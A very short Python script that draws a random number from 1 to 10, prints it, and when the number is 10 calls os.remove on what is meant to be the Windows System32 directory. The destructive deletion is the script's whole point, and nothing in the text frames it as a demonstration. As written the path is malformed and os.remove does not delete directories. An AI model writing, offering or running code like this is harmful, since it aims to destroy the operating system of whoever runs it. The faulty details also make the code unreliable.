import random
import os
elements = [1,2,3,4,5,6,7,8,9,10]
number = random.choice(elements)
print(number)
if number == 10:
    os.remove(r"C:Windows\System32")